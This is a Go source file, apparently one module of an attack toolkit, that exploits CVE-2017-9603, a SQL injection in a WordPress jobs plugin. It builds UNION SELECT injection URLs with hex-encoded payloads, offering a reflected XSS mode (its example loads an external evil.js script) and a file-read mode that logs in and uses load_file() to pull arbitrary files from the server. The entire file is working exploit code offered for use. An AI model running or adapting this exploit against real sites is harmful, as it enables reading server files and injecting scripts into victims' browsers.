package modules

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

//CVE20179603 ...
func CVE20179603() {
	var url, payload, option string
	sqli := "/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=5+AND+1%3D2+UNION+SELECT+NULL%2CNULL%2CNULL%2C"

	fmt.Printf("Url: ")
	fmt.Scanf("%s, ", &url)

	fmt.Printf("Esse exploit esta em estagio beta, selecione o modulo XSS ou FileRead\nModulo: ")
	fmt.Scanf("%s", &option)
	switch option {
	case "XSS":
		fmt.Println("Digite o payload (Reflect XSS). Ex: <script src='http://localhost:8080/evil.js'></script>")
		fmt.Printf("Payload: ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		payload = scanner.Text()
		hxpayload := hex.EncodeToString([]byte(payload))

		url = url + sqli + "0x" + hxpayload + "%2CNULL%2CNULL--+"
		fmt.Println("Payload XSS\n" + url)
	case "FileRead":
		cookie := Login(url)
		fmt.Printf("Arquivo: ")
		fmt.Scanf("%s", &payload)
		hxpayload := hex.EncodeToString([]byte(payload))

		client := new(http.Client)
		req, _ := http.NewRequest("GET", url+sqli+"load_file(0x"+hxpayload+")%2CNULL%2CNULL--+", nil)
		req.Header.Set("Cookie", cookie)
		resp, _ := client.Do(req)
		body, _ := ioutil.ReadAll(resp.Body)
		result := string(body)
		indOne := strings.Index(result, "Download Resume")
		indTwo := strings.Index(result, "No resume was attached")
		fmt.Println("\n" + result[indOne+146:indTwo-64])
	}

}
